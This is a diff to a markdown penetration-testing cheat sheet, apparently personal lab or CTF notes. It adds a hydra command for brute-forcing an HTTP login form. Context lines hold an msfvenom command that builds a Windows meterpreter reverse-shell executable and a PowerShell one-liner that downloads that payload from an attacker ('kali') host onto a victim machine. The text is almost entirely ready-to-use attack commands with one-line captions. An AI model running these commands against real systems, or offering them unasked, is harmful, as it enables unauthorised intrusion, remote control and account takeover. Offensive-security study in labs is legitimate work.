@@ -9,6 +9,9 @@
 * `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe >m.exe` _Make a standard meterpreter exe_
 * `tcpdump -i {tun0} icmp` _Listen for ping requests.  Useful when testing RCE_
 
+## Password Attacks
+* `hydra -l {username} -P {password file} {base url or ip} -s{port} http-post-form "/index.php:user=^USER^&password=^PASS^:{failed string}"`  _Brute force http post login with hydra_
+
 ## Priv Esc Windows
 * `powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://{kali_ip}:8080/m.exe', 'c:\users\victim\desktop\m.exe') }"` _Powershell download a file_
 * `systeminfo >systeminfo.txt` _Export sysinfo from windows
